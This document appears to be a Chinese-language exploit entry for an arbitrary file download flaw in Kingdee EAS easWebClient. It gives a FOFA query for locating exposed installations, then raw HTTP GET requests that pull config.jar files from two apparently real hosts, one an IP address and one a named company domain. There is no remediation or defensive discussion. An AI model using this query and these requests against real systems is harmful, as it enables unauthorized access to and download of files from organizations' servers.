# 金蝶-EAS easWebClient 任意文件下载漏洞

    ## fofa

```
body="easSessionId" || header="easportal" || header="eassso/login" || banner="eassso/login" || body="/eassso/common" || (title="EAS系统登录" && body="金蝶")
```

## Poc

```
GET /easWebClient/bin/lib/config.jar HTTP/1.1
Host: 106.75.115.79
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
Accept-Encoding: gzip
```

```
GET /easWebClient/bin/config.jar HTTP/1.1
Host: eas.only-china.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
Accept-Encoding: gzip


```
